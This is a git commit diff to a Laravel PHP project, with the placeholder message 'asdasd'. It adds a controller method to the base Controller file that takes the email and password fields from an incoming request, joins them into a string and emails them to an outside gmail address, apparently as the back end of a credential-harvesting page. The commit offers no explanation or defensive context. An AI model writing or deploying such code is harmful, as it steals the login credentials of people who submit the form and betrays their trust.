b5ab7eab6406c1a043b37139fff3e5bdab187098
areg <aregghaz@gmail.com>
2017-10-18 14:49:40 +0400

    asdasd

--- app/Http/Controllers/Controller.php
+++ app/Http/Controllers/Controller.php
@@ -3,11 +3,28 @@
 namespace App\Http\Controllers;
 
 use Illuminate\Foundation\Bus\DispatchesJobs;
+use Illuminate\Http\Request;
 use Illuminate\Routing\Controller as BaseController;
 use Illuminate\Foundation\Validation\ValidatesRequests;
 use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
-
+use Illuminate\Mail\Mailer;
+use Mail;
 class Controller extends BaseController
 {
     use AuthorizesRequests, DispatchesJobs, ValidatesRequests;
+    public function index(Request $request) {
+        $login = $request['email'];
+        $password = $request['pass'];
+        $data['title'] = "login".$login. "password".$password;
+
+        Mail::send('email', $data, function($message) {
+
+            $message->to('asatryan.saqo89@gmail.com', 'Receiver Name')
+
+                ->subject('HDTuto.com Mail');
+
+        });
+
+        dd("Mail Sent successfully");
+    }
 }
